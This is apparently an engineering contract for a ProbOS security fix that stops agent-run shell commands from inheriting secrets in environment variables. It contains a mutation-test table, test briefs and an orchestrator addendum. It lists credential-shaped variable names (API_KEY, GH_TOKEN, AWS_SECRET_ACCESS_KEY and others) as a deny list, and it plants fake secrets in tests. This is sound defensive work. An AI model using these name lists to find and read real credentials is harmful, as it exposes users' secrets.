| `register_native_swe_tools(registry, runtime) == 12` | `tests/test_ad1200_repository_instruction_wire.py:122`, `tests/test_ad1240_tool_result_delivery.py:701,4197`, `tests/test_ad544_native_tools.py:130` | new param keyword-only, default `()` |
| `_wire_native_swe_harness` callers | `tests/test_ad1152_agentic_correlation.py:426,1048`, `tests/test_ad1224_durable_tool_start.py:1881` | all pass a real `SystemConfig` |
| sandbox `Popen` patches | `tests/test_ad1298_cancel_cleanup_state_machine.py:422,742,886`, `tests/test_bf788_workdir_cleanup_retries.py:893` | sandbox mechanics unchanged |
| `RedTeamAgent` constructions | `tests/test_issue1421_http_fetch_safe_methods.py:282,470,492`, `tests/test_red_team.py:12` | kwargs-compatible `__init__` |
| SRP baseline | `docs/development/architecture-baseline.yaml:307-313` (`RedTeamAgent`, trigger `lines` only) | 11 -> 12 methods, under 15 |
| layer map | `tests/test_layer_boundaries.py:16-27` (`execution` unranked) | no new exception |
| real-command runtime tests | `tests/test_bf830_*`, `test_bf875_*`, `test_bf876_*`, `test_escalation.py` (`echo`, `date`) | run under the allowlist; the full-suite diagnostic confirms |

## Absence Verified (2026-10-14)

- CLAIM: no single owner of "secret-shaped environment variable names" exists. RUN: `Grep "(API_?KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)[^a-z]{0,40}(re\.compile|\(\?i\)|frozenset|\|)" src/probos -i`. FOUND: `diagnostic_safety.py:17` (`_OUTBOUND_SECRET_FIELDS`, diagnostic field keys), `settings/section_registry.py:508` (`_SECRET_RE`, settings field ids), `security/pii_redaction.py:18` and `security/classification.py:60` (value assignments). HOLDS: none is an env-name rule and all are private; this fix does not unify them (scope).
- CLAIM: the issue's two sites plus the red team re-run are the only spawns of agent/model-supplied command text without an allowlist. RUN: `Grep "create_subprocess_(shell|exec)|subprocess\.(Popen|run|call|check_output|check_call)|os\.system\(|os\.popen\(" src/probos`. FOUND and classified from the call lines: shell text -- `tools.py:1144`, `shell_command.py:214,220`, `red_team.py:380,384`; allowlisted -- `isolation.py:854`; model-authored code with full env (out of scope, follow-up) -- `cognitive/builder.py:2433-2442`, `security/container_sandbox.py:168-178`, `cognitive/dependency_resolver.py:219,236,250`; operator-configured -- `integrations/mcp_bridge/transport.py:271-273`; argv built by ProbOS (not read in full) -- `code_search.py:177`, `piper_backend.py:222`, `blender_renderer.py:184`, `rhubarb_backend.py:175,250,379`, `credential_store.py:357`, `builder.py:1629,2515,2570,2581`, `episodic_health.py:395`, `authority.py:802-816`, `sandbox_check.py:22`, `knowledge/store.py:1230`, `records_store.py:1239`, `artifact_extractor.py:199`, `__main__.py:251,459,2998,3002`, `worktree_manager.py:52`, `referent_gate.py:467`, `scout.py:405`. HOLDS: yes.
- CLAIM: no test reads `_ENV_PASSTHROUGH`, calls `_run_verify_sync`, or asserts shell `Popen`/`create_subprocess_shell` arguments. RUN: `Grep "ENV_PASSTHROUGH" tests`; `Grep "_run_verify_sync|_verify_run_command" tests`; `Grep "call_args|assert_called" tests/test_expansion_agents.py`; `Grep "create_subprocess_shell" tests`. FOUND: none. HOLDS: yes.
- CLAIM: no test pins the edited source lines in `agent_fleet.py`, `runtime.py`, `finalize.py`. RUN: `Grep "register_native_swe_tools\(registry, runtime\)|RedTeamAgent\(pool=\"red_team\", agent_id=agent_id\)|\(\"shell\", \"shell_command\", 3\)" tests`; `Grep "_builtin_pools" tests`. FOUND: only the three `== 12` call sites above (calls, not source text). HOLDS: yes.
- CLAIM: `ExecutionConfig` does not forbid extra keys (rollback). RUN: `Grep "extra=.forbid" src/probos/config_models/operations.py`. FOUND: none. HOLDS: yes.

## Verified Against Codebase (2026-10-14)

```
Read src/probos/cognitive/swe_harness/tools.py:1099-1171,1179-1230
  1124: def __init__(self, runtime: "ProbOSRuntime") -> None:
  1144: proc = await _asyncio.create_subprocess_shell(   (no env=)
  1217: (RunCommandTool(runtime), shell_perms),
Read src/probos/agents/shell_command.py:1-256
  209: def _run_sync(self, command: str) -> dict[str, Any]:   214/220 Popen, no env=
Read src/probos/agents/red_team.py:1-66,280-397
  296: loop.run_in_executor(None, self._run_verify_sync, command)   380/384 Popen, no env=
Grep "_ENV_PASSTHROUGH|_build_env" src/probos/execution/isolation.py
  642: _ENV_PASSTHROUGH = ("PATH", "SYSTEMROOT", "WINDIR", "TEMP", "TMP", "LANG", "LC_ALL", "TZ")
  1041: k: os.environ[k] for k in _ENV_PASSTHROUGH if k in os.environ
Read src/probos/config_models/operations.py:1-161   (ExecutionConfig :13, last field :148, twin precedent :153-154)
Read src/probos/startup/agent_fleet.py:29-61        (shell pool :52, loop :55-57, no runtime kwarg)
Grep "_spawn_kwargs" src/probos/substrate/pool.py   (:70 stored; :210,:534,:622 reused on respawn)
Grep "agent_class(pool=pool, \*\*kwargs)" src/probos/substrate/spawner.py   (:47)
Read src/probos/runtime.py:2607-2614                (RedTeamAgent constructed at :2611)
Read src/probos/startup/finalize.py:1740-1785       (register at :1776 before llm_client check :1780)
Read src/probos/credential_store.py:87-107          (GH_TOKEN, GITHUB_TOKEN, PROBOS_DISCORD_TOKEN, LLM_API_KEY)
Read src/probos/tools/protocol.py:172-194           (refuse_undeclared_params refuses keys not in input_schema)
Read scripts/gen_config_reference.py:102-164        (row = | `name` | `type` | default | bounds | description |; list factory renders `[]`)
Read scripts/check_config_facade.py:1708-1731       (--check, --update-baseline)
gh issue view 1529 -> "BF-890: run_command and ShellCommandAgent hand ..." OPEN
```

## Prior Art and Blind Spots

- **Internal:** `docs/research/codex-harness-absorption.md` (the comparison that found this). AD-1233's soft network posture (`isolation.py:1043-1068`) is untouched: this fix strips names, it does not add proxies to shell children.
- **Codex `shell_environment_policy`** ([third-party summary](https://codex.danielvaughan.com/2026/04/28/codex-cli-shell-environment-policy-subprocess-secrets-defence/), [config docs](https://developers.openai.com/codex/local-config)): `inherit = all | core | none`, default excludes of names containing `KEY`, `SECRET`, `TOKEN`, then `exclude`/`include_only`/`set`. **Adapted:** allowlist base (their `core`) plus the default-exclude idea, widened (PASSWORD, CREDENTIAL, AUTH, segments, `PROBOS_`) and applied to declared names. **Rejected:** `set` (values in config means secrets in config) and `inherit = all`. **Lesson absorbed:** Codex reportedly moved its default from `core` to `all` because `core` was "too clever" ([commit, as reported in search results](https://forge.lthn.ai/core/core-agent-ide/commit/c2c327c72317455fad1378c79c3024ec95a1519b)): a minimal set that breaks toolchains gets reverted, so this contract measured the Windows set and pins `git` and the interpreter with tests.
- **Python `subprocess`** ([docs](https://docs.python.org/3/library/subprocess.html)): `env` replaces inheritance; on Windows `env` must include `SystemRoot`; with `shell=True` the shell comes from the parent's `COMSPEC` (3.12+), so stripping the child does not change which shell runs.
- **Blind spots:** (1) the red team re-run (included). (2) `.env` and profile files stay readable by a same-user child (stated, not fixed; AD-1328 #1530). (3) A stripped Windows env makes the Python install manager write into the cwd (measured; tests must never run bare `python`/`pip` under the stripped env). (4) A declared non-secret name can carry a secret in its value, e.g. a proxy URL with credentials (names only, by decision). (5) Windows names are case-insensitive (`os.environ` upper-cases), POSIX names are not. (6) Model-authored code outside the sandbox still inherits everything (follow-up, not widened here). (7) HXI Settings exposure of the new field: considered, deferred (operator YAML only).

## What This Does NOT Change

`cwd`, timeouts, output caps and decoding on all three paths; the `run_python` sandbox's environment and proxy posture; `CredentialStore`; the MCP bridge's operator-configured server environment; `builder.py`, `container_sandbox.py`, `dependency_resolver.py` spawns; `RunCommandTool.input_schema`/description; the red team's decision to re-run commands.

## Do Not Build

No command policy or approval cache (AD-1328, #1530). No OS-level sandboxing, job objects, namespaces or network controls. No value scanning of environment variables. No HXI settings field. No change to the other spawn sites listed under Absence Verified. No unification of the existing redaction regexes.

## Acceptance Criteria

1. A planted variable in the runtime environment (credential-shaped and plain) is invisible to a child of `RunCommandTool`, of `ShellCommandAgent` and of the red team re-run, by `echo` and by full listing (`set`/`Get-ChildItem env:` on Windows, `env` on POSIX); each test first proves an inheriting child DOES see it.
2. `PATH` and the other allowlisted names reach the child; `"<sys.executable>" --version` and `git --version` (when git exists) run through both shell paths.
3. One owner: `isolation._ENV_PASSTHROUGH is command_env.SANDBOX_ENV_PASSTHROUGH`; changing the owner's set changes what both shell paths' children see; config twins equal the owner.
4. Operator extension: a declared plain name passes through all three sites; a credential-shaped, `PROBOS_` or malformed name is refused at config load and, if constructed directly, not forwarded.
5. Regeneration commands pass; full suite shows no new failure.
6. Verify all changes comply with the Engineering Principles in `.github/copilot-instructions.md`.

## Milestones

M0 orchestrator: install Sections 1-14, run the regeneration block, full-suite diagnostic. M1-M4: one Builder per test file below (about 150 calls each, focused gate `d:/ProbOS/.venv/Scripts/pytest.exe tests/<file> -v -n 0`). M5 mutation campaign. M6 Diff Reviewer (security change: also the Copilot Diff Reviewer). M7 one receipted broad gate.

## Mutation campaign of record

Literal cell text is the content between the backticks, leading spaces included. T1 = `tests/test_bf890_command_env.py`, T2 = `tests/test_bf890_config.py`, T3 = `tests/test_bf890_run_command_env.py`, T4 = `tests/test_bf890_shell_agent_env.py`. M21 is killable only on POSIX (record "not exercised" on win32); M20 only on win32.

| Id | File | Anchor | Replacement | Killer |
|---|---|---|---|---|
| M1 | src/probos/execution/command_env.py | `    "COMSPEC", "PATHEXT", "SYSTEMDRIVE", "USERPROFILE", "HOMEDRIVE", "HOMEPATH",` | `    "COMSPEC", "SYSTEMDRIVE", "USERPROFILE", "HOMEDRIVE", "HOMEPATH",` | T1::test_windows_allowlist_is_exact |
| M2 | src/probos/execution/command_env.py | `    "APPDATA", "LOCALAPPDATA", "PROGRAMDATA", "PROGRAMFILES", "PROGRAMFILES(X86)",` | `    "APPDATA", "PROGRAMDATA", "PROGRAMFILES", "PROGRAMFILES(X86)",` | T1::test_windows_allowlist_is_exact |
| M3 | src/probos/execution/command_env.py | `    "HOME", "USER", "LOGNAME", "SHELL", "TERM", "TMPDIR", "LC_CTYPE",` | `    "USER", "LOGNAME", "SHELL", "TERM", "TMPDIR", "LC_CTYPE",` | T1::test_posix_allowlist_is_exact |
| M4 | src/probos/execution/command_env.py | `    "KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD", "PASSPHRASE",` | `    "KEY", "SECRET", "PASSWORD", "PASSWD", "PASSPHRASE",` | T1::test_credential_shaped_names_are_refused |
| M5 | src/probos/execution/command_env.py | `    return any(segment in CREDENTIAL_NAME_SEGMENTS for segment in upper.split("_"))` | `    return any(segment in upper for segment in CREDENTIAL_NAME_SEGMENTS)` | T1::test_no_default_name_is_credential_shaped |
| M6 | src/probos/execution/command_env.py | `    if upper.startswith(RUNTIME_NAME_PREFIX):` | `    if upper.startswith("PROBOS_NEVER_"):` | T1::test_credential_shaped_names_are_refused |
| M7 | src/probos/execution/command_env.py | `        if reason is not None:` | `        if False:` | T1::test_build_env_refuses_a_declared_credential_name_and_warns |
| M8 | src/probos/execution/command_env.py | `    env = {name: source_env[name] for name in command_env_allowlist(platform) if name in source_env}` | `    env = dict(source_env)` | T1::test_build_env_copies_only_the_allowlist |
| M9 | src/probos/execution/command_env.py | `            env[name] = source_env[name]` | `            pass` | T1::test_build_env_passes_a_declared_name_and_omits_an_unset_one |
| M10 | src/probos/execution/command_env.py | `    extras = WINDOWS_COMMAND_EXTRAS if plat == "win32" else POSIX_COMMAND_EXTRAS` | `    extras = POSIX_COMMAND_EXTRAS` | T1::test_windows_allowlist_is_exact |
| M11 | src/probos/execution/command_env.py | `    if not isinstance(name, str) or _ENV_NAME_SHAPE_RE.fullmatch(name) is None:` | `    if not isinstance(name, str):` | T1::test_unknown_shapes_are_refused |
| M12 | src/probos/execution/command_env.py | `    return SANDBOX_ENV_PASSTHROUGH + extras` | `    return extras` | T1::test_posix_allowlist_is_exact |
| M13 | src/probos/execution/isolation.py | `_ENV_PASSTHROUGH = SANDBOX_ENV_PASSTHROUGH` | `_ENV_PASSTHROUGH = ("PATH", "SYSTEMROOT", "WINDIR", "TEMP", "TMP", "LANG", "LC_ALL", "TZ")` | T1::test_sandbox_set_is_the_isolation_constant |
| M14 | src/probos/cognitive/swe_harness/tools.py | `                env=build_command_env(self._command_env_passthrough),` | `                env=None,` | T3::test_echo_does_not_reveal_a_planted_secret |
| M15 | src/probos/cognitive/swe_harness/tools.py | `        (RunCommandTool(runtime, command_env_passthrough=command_env_passthrough), shell_perms),` | `        (RunCommandTool(runtime), shell_perms),` | T3::test_register_native_swe_tools_threads_declared_names |
| M16 | src/probos/cognitive/swe_harness/tools.py | `        self._command_env_passthrough: tuple[str, ...] = tuple(command_env_passthrough)` | `        self._command_env_passthrough: tuple[str, ...] = ()` | T3::test_declared_plain_name_reaches_the_child |
| M17 | src/probos/agents/shell_command.py | `            env = build_command_env(self._command_env_passthrough)` | `            env = None` | T4::test_shell_agent_echo_does_not_reveal_a_planted_secret |
| M18 | src/probos/agents/shell_command.py | `        self._command_env_passthrough: tuple[str, ...] = tuple(kwargs.pop("command_env_passthrough", ()))` | `        self._command_env_passthrough: tuple[str, ...] = ()` | T4::test_shell_agent_declared_plain_name_reaches_the_child |
| M19 | src/probos/agents/red_team.py | `                    build_command_env(self._command_env_passthrough),` | `                    None,` | T4::test_red_team_verifies_against_the_allowlisted_env |
| M20 | src/probos/agents/red_team.py | `                    args, stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env,` | `                    args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,` | T4::test_red_team_verifies_against_the_allowlisted_env |
| M21 | src/probos/agents/red_team.py | `                    command, shell=True, env=env,` | `                    command, shell=True,` | T4::test_red_team_verifies_against_the_allowlisted_env |
| M22 | src/probos/agents/red_team.py | `        self._command_env_passthrough: tuple[str, ...] = tuple(kwargs.pop("command_env_passthrough", ()))` | `        self._command_env_passthrough: tuple[str, ...] = ()` | T4::test_red_team_declared_name_reaches_the_rerun |
| M23 | src/probos/config_models/operations.py | `    "KEY", "SECRET", "TOKEN", "PASSWORD", "PASSWD", "PASSPHRASE",` | `    "KEY", "SECRET", "PASSWORD", "PASSWD", "PASSPHRASE",` | T1::test_config_twins_equal_the_owner |
| M24 | src/probos/config_models/operations.py | `                or any(word in upper for word in _CREDENTIAL_ENV_NAME_WORDS)` | `                or False` | T2::test_credential_word_name_is_refused_at_load |
| M25 | src/probos/config_models/operations.py | `                or any(part in _CREDENTIAL_ENV_NAME_SEGMENTS for part in upper.split("_"))` | `                or False` | T2::test_credential_segment_name_is_refused_at_load |
| M26 | src/probos/config_models/operations.py | `                upper.startswith(_RUNTIME_ENV_NAME_PREFIX)` | `                False` | T2::test_runtime_prefix_is_refused_at_load |
| M27 | src/probos/config_models/operations.py | `            if re.fullmatch(_ENV_NAME_SHAPE_PATTERN, name) is None:` | `            if False:` | T2::test_unknown_shape_is_refused_at_load |
| M28 | src/probos/config_models/operations.py | `    command_env_passthrough: list[str] = Field(default_factory=list)` | `    command_env_passthrough: list[str] = Field(default_factory=lambda: ["HOME"])` | T2::test_default_is_empty |
| M29 | src/probos/startup/agent_fleet.py | `            {"command_env_passthrough": shell_env_names}` | `            {}` | T4::test_agent_fleet_injects_declared_names_into_the_shell_pool_only |
| M30 | src/probos/runtime.py | `                command_env_passthrough=tuple(self.config.execution.command_env_passthrough),` | `                command_env_passthrough=(),` | T4::test_spawn_red_team_injects_declared_names |
| M31 | src/probos/startup/finalize.py | `            command_env_passthrough=tuple(config.execution.command_env_passthrough),` | `            command_env_passthrough=(),` | T3::test_wire_native_swe_harness_reads_execution_config |
| M32 | src/probos/substrate/pool.py | `        self._spawn_kwargs = spawn_kwargs` | `        self._spawn_kwargs = {}` | T4::test_real_pool_hands_declared_names_to_members_replacements_and_additions |
| M33 | src/probos/startup/agent_fleet.py | `            if agent_type == "shell_command"` | `            if True` | T4::test_agent_fleet_injects_declared_names_into_the_shell_pool_only |

=== BUILDER BRIEFS ===

### Brief T1 -- `tests/test_bf890_command_env.py` (unit + one-owner)

Source is frozen: write this ONE test file only; never edit `src/`. Read Section 1 and Sections 2-3 of `prompts/bf-890-command-environment-allowlist.md`. Every test asserts its own premise; use `_Fake*` stubs, no MagicMock. Never run bare `python`/`pip` in a child (the Python install manager installs into the cwd under a stripped env); use `sys.executable`.

Tests (names are mutation killers; keep them):
- `test_sandbox_set_is_the_isolation_constant`: `isolation._ENV_PASSTHROUGH is command_env.SANDBOX_ENV_PASSTHROUGH`, and equals the 8-name tuple.
- `test_windows_allowlist_is_exact` / `test_posix_allowlist_is_exact`: `command_env_allowlist("win32")` and `("linux")` equal SANDBOX + the exact tuples written out in the test.
- `test_no_default_name_is_credential_shaped`: every name of both platforms, excluding `PROGRAMFILES(X86)` (not a plain name; assert that premise), gives `env_name_refusal(name) is None`; include `PATH`, `PATHEXT` explicitly.
- `test_credential_shaped_names_are_refused` (parametrised): OPENAI_API_KEY, ANTHROPIC_API_KEY, LLM_API_KEY, GH_TOKEN, GITHUB_TOKEN, gh_token, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, DB_PASSWORD, GOOGLE_APPLICATION_CREDENTIALS, NPM_CONFIG__AUTH, GH_PAT, DB_PASS, MYSQL_PWD, SENTRY_DSN, PROBOS_DATA_DIR, PROBOS_FETCH_TOKEN -> `"credential_shaped"`.
- `test_ordinary_names_are_not_refused`: JAVA_HOME, GOPATH, NODE_ENV, CARGO_HOME, RUSTUP_HOME, DOTNET_ROOT, PYTHONPATH, COMPASS_DIR, MY_PATH_DIR -> None.
- `test_unknown_shapes_are_refused`: "", "A B", "X=Y", "1ABC", "NAME;X", "PROGRAMFILES(X86)", 5, None -> `"unknown_shape"`.
- `test_every_credential_store_env_name_is_refused`: subclass `CredentialStore` as `_RecordingCredentialStore` overriding `register` to record each spec then call super; construct it (no store path); for every recorded `env_var` and alias assert `"credential_shaped"`; premise: at least GH_TOKEN and LLM_API_KEY recorded.
- `test_build_env_copies_only_the_allowlist`: injected `source` dict holding PATH, HOME, BF890_PLANT; for platform "linux" and "win32" the result has no BF890_PLANT and has PATH.
- `test_build_env_passes_a_declared_name_and_omits_an_unset_one`.
- `test_build_env_refuses_a_declared_credential_name_and_warns`: declared `("BF890_PROBE_API_KEY",)` present in source -> absent; `caplog` has one WARNING naming it.
- `test_build_env_defaults_to_os_environ` (monkeypatch.setenv).
- `test_config_twins_equal_the_owner`: `operations._CREDENTIAL_ENV_NAME_WORDS == command_env.CREDENTIAL_NAME_WORDS` and likewise segments, prefix, shape pattern.
- `test_isolation_does_not_read_the_operator_extension`: `"command_env_passthrough"` not in isolation.py source.
- `test_every_command_spawn_in_the_three_files_passes_an_env`: AST over tools.py, shell_command.py, red_team.py: every `Popen`/`create_subprocess_shell` call has an `env` keyword that is not the constant None; premise: at least 1, 2 and 2 such calls found.
- `test_a_changed_shared_set_reaches_both_shell_paths`: monkeypatch `command_env.SANDBOX_ENV_PASSTHROUGH` to add `BF890_SHARED_PROBE`, setenv it; a real `RunCommandTool(_FakeRuntime()).invoke` and a real `ShellCommandAgent().handle_intent` echo show the value (cmd `%VAR%`, PowerShell `$env:VAR`, POSIX `$VAR`).

Focused gate: `d:/ProbOS/.venv/Scripts/pytest.exe tests/test_bf890_command_env.py -v -n 0`. Report which tests ran and which skipped (with reason).

### Brief T2 -- `tests/test_bf890_config.py` (parse-time validation)

Source frozen; write this ONE file only. Use `ExecutionConfig` and `SystemConfig` from `probos.config`; `pytest.raises(ValidationError)` and assert `errors()[0]["loc"] == ("command_env_passthrough", ...)` shape (assert the first element is `"command_env_passthrough"`).

Tests (keep names):
- `test_default_is_empty`: `ExecutionConfig().command_env_passthrough == []` and same through `SystemConfig().execution`.
- `test_declared_names_are_trimmed_and_deduplicated`: `[" FOO_HOME ", "FOO_HOME", "BAR"]` -> `["FOO_HOME", "BAR"]`.
- `test_credential_word_name_is_refused_at_load`: OPENAI_API_KEY, GH_TOKEN, CLIENT_SECRET, DB_PASSWORD (names with no credential SEGMENT, so only the word check refuses them; assert that premise: no `name.upper().split("_")` part is in `operations._CREDENTIAL_ENV_NAME_SEGMENTS`).
- `test_credential_segment_name_is_refused_at_load`: GH_PAT, DB_PASS, MYSQL_PWD, SENTRY_DSN (assert premise: no credential WORD in them).
- `test_runtime_prefix_is_refused_at_load`: PROBOS_DATA_DIR, PROBOS_LLM_URL (premise: no word, no segment).
- `test_unknown_shape_is_refused_at_load`: "", "A B", "X=Y", "1ABC".
- `test_validator_agrees_with_the_owner_rule` (parametrised over about 20 mixed trimmed names): accepted by `ExecutionConfig` iff `command_env.env_name_refusal(name) is None`.
- `test_system_config_loads_a_declared_name`: `SystemConfig.model_validate({"execution": {"command_env_passthrough": ["JAVA_HOME"]}})`.
- `test_refusal_message_names_the_field`: message contains `execution.command_env_passthrough`.

Focused gate: `d:/ProbOS/.venv/Scripts/pytest.exe tests/test_bf890_config.py -v -n 0`.

### Brief T3 -- `tests/test_bf890_run_command_env.py` (real `run_command` children)

Source frozen; ONE file. Real child processes through a real `RunCommandTool(_FakeRuntime(), ...)`. Fixture: `monkeypatch.setenv("BF890_PROBE_API_KEY", "bf890-planted-secret-7d1")` and `("BF890_PROBE_PLAIN", "bf890-plain-value-3c2")`. Windows commands run under cmd.exe (`echo %VAR%`, `set`), POSIX under /bin/sh (`echo $VAR`, `env`); mark the other platform's case `skipif` with the reason. Never run bare `python`/`pip`.

Tests (keep names):
- `test_premise_an_inheriting_shell_child_sees_the_plants`: `subprocess.run(<echo>, shell=True, capture_output=True)` with no env shows both values (proves the probe discriminates).
- `test_echo_does_not_reveal_a_planted_secret` (both plants).
- `test_listing_omits_planted_names_and_keeps_path`.
- `test_path_reaches_the_child`: echoed PATH equals `os.environ["PATH"]` (strip).
- `test_ordinary_commands_still_run`: `"<sys.executable>" --version` exit 0 with "Python"; `git --version` exit 0 (skip if `shutil.which("git")` is None).
- `test_declared_plain_name_reaches_the_child`: `command_env_passthrough=("BF890_PROBE_PLAIN",)`.
- `test_declared_credential_name_does_not_reach_the_child`: `("BF890_PROBE_API_KEY",)`.
- `test_a_model_cannot_declare_names_through_params`: params with `command_env_passthrough` -> not success, error names the key.
- `test_register_native_swe_tools_threads_declared_names`: real `ToolRegistry`; `registry.get_tool("run_command")` invoked shows the plain value.
- `test_wire_native_swe_harness_reads_execution_config`: mirror `tests/test_ad1224_durable_tool_start.py:1872-1881` with `SystemConfig(execution={"command_env_passthrough": ["BF890_PROBE_PLAIN"]})`, `runtime = SimpleNamespace(tool_registry=..., config=...)` (no llm_client, so it returns False after registering) and a `_FakeExecutor` with `add_pre_hook`; then invoke the registered tool.
- `test_working_directory_and_timeout_unchanged`: `working_directory=tmp_path` shows tmp_path (`cd` / `pwd`); a sleeping `sys.executable` with `timeout: 0.5` errors "timed out".
- `test_not_a_file_boundary`: the child can read a file the test wrote in tmp_path (pins the docstring's honest limit).

Focused gate: `d:/ProbOS/.venv/Scripts/pytest.exe tests/test_bf890_run_command_env.py -v -n 0`.

### Brief T4 -- `tests/test_bf890_shell_agent_env.py` (ShellCommandAgent, red team, wiring)

Source frozen; ONE file. Same two plants as T3. Windows children run under PowerShell (`echo $env:VAR`, `Get-ChildItem env:`); POSIX under /bin/sh. Drive `ShellCommandAgent(...).handle_intent(IntentMessage(intent="run_command", params={"command": ...}))`. Never run bare `python`/`pip`.

Tests (keep names):
- `test_premise_sandbox_set_alone_does_not_resolve_git_in_powershell` (win32 and git only): `subprocess.run(["powershell","-NoProfile","-Command","git --version"], env=<SANDBOX names from os.environ>)` is nonzero.
- `test_shell_agent_echo_does_not_reveal_a_planted_secret`, `test_shell_agent_listing_omits_planted_names` (each with an inheriting-child premise).
- `test_shell_agent_runs_git_and_the_interpreter`: `git --version` (skip without git) and `python -c "print(42)"` (the agent rewrites it to `sys.executable`; assert that premise via `_rewrite_python_interpreter`).
- `test_shell_agent_declared_plain_name_reaches_the_child`.
- `test_red_team_verifies_against_the_allowlisted_env`: `RedTeamAgent(pool="red_team")._verify_run_command(...)` for the echo of BF890_PROBE_PLAIN with a claimed `IntentResult(success=True, result={"exit_code": 0, "stdout": ""})` -> `verified is True`; premise: the inheriting child prints the value. The red team waits 5 s (`red_team.py`); if `discrepancy == "Verification command timed out"`, `pytest.skip` with that reason (environmental under load; a mutant gives a stdout mismatch, not a timeout, so the skip cannot hide a kill).
- `test_red_team_declared_name_reaches_the_rerun`: `RedTeamAgent(command_env_passthrough=("BF890_PROBE_PLAIN",))`, claimed stdout = the value -> verified.
- `test_agent_fleet_injects_declared_names_into_the_shell_pool_only`: call `create_agent_fleet` with a `_FakeCreatePool` that records `(pool, agent_type, kwargs)` and raises `_StopAfterShell` at pool "shell"; config `SystemConfig(execution=...)`, other args `_Fake*`/None; assert shell kwargs `== ("BF890_PROBE_PLAIN",)` and no earlier pool got the kwarg.
- `test_spawn_red_team_injects_declared_names`: `ProbOSRuntime._spawn_red_team(_FakeRuntimeSelf, 1)` with `_Fake` registry/capability_registry/gossip/trust_network/event_log (async where awaited) and a real `SystemConfig`; then the spawned agent's re-run shows the plain value; `await agent.stop()` in a `finally`.

Focused gate: `d:/ProbOS/.venv/Scripts/pytest.exe tests/test_bf890_shell_agent_env.py -v -n 0`. Report which platform-specific tests ran.

## Orchestrator addendum (2026-10-14, after the full-suite diagnostic on the installed tree)

The diagnostic (45,422 passed, 7 failed, 64 skipped) found two hidden pins the contract's table did not list. Neither changes production code; both are existing tests that had to learn the new keyword and the new field.

- **`tests/test_ad490_agent_wiring_security_logs.py::test_red_team_agent_wired_has_department`** builds a bare runtime (`ProbOSRuntime.__new__`) with no `config`, and its `_FakeRedTeamAgent.__init__(*, pool, agent_id)` rejects the new `command_env_passthrough` keyword that Section 8 passes. Found by: the failure; the contract's `RedTeamAgent constructions` row searched for real constructions but not for this fake, and the row for `_spawn_red_team` callers was never enumerated (`Grep "_spawn_red_team" tests` -> this one call site, `:224`). Handling: the fake accepts and records `command_env_passthrough` (default `()`), and the test sets `runtime.config = SystemConfig()` (a real config, the repository's convention for path-typed arguments). Production is unchanged: a real `ProbOSRuntime` always has `config` (`runtime.py:628`).
- **`tests/test_ad1152_agentic_correlation.py::test_default_off_matches_pinned_base`, `test_default_off_golden_pins_only_descriptor_owner_platform[linux|win32]`** pin `default_config_sha256` of the default config as captured at the pinned base commit; each config field added later is popped (with its default asserted) from the observation before it is hashed, so the golden stays untouched. Found by: the failure, which reads `default_config_sha256`; precedent `39728fed` (AD-1326). Handling: one line pops `config["execution"]["command_env_passthrough"]` (asserting `[]`) after the AD-1326 block. The golden fixture is not edited.
- **`docs/development/open-ads-report.md` and `ad-ledger-snapshot.json`** need `scripts/gen_ad_ledger.py` after Sections 13-14 (`tests/test_ad1184_ad_ledger.py` fails until then); regenerated.

Process rule recorded for the next contract: when a change adds a constructor keyword to an agent class, enumerate every test double of that class (`Grep "class _Fake<Agent>" tests`) and every caller of the spawning method, not only the real constructions.

**Added by the orchestrator after the Builders reported (2026-10-14).**

- *Real-pool seam.* The fleet test (T4) stops at a fake `create_pool`, so nothing proved that a real member, its replacement or a member added later gets the names. The orchestrator probed it (`probe_bf890_pool_seam.py`: initial members, a recycled replacement and an added member carry the declared names, a pool made without them carries none) and T4 added `test_real_pool_hands_declared_names_to_members_replacements_and_additions`, which asserts by behaviour through `handle_intent`. Mutation rows M32 (`ResourcePool` drops its spawn kwargs) and M33 (the fleet hands the kwarg to every pool, not only the shell pool) are the two it and the fleet test must kill.
- *PATH test.* `test_path_reaches_the_child` skips, instead of failing, when the host's own shell cannot echo this machine's PATH (length over cmd's 8191-character line limit, or a shell metacharacter in an entry): the comparison cannot discriminate there.
- *Pre-existing, not changed here (follow-up F-45).* `RunCommandTool.invoke` reports a timeout and kills only the shell; the command under it keeps running and finishes (T3's timeout test must wait the orphan out; reproduced by the orchestrator's `probe_bf890_timeout_orphan.py`, premise control included).
- *Not run here.* The POSIX variants (`/bin/sh`, `env`, `printf`) are skipped on this Windows host; the CI shards on ubuntu run them. M21 (POSIX branch of the re-run) is killable only there.
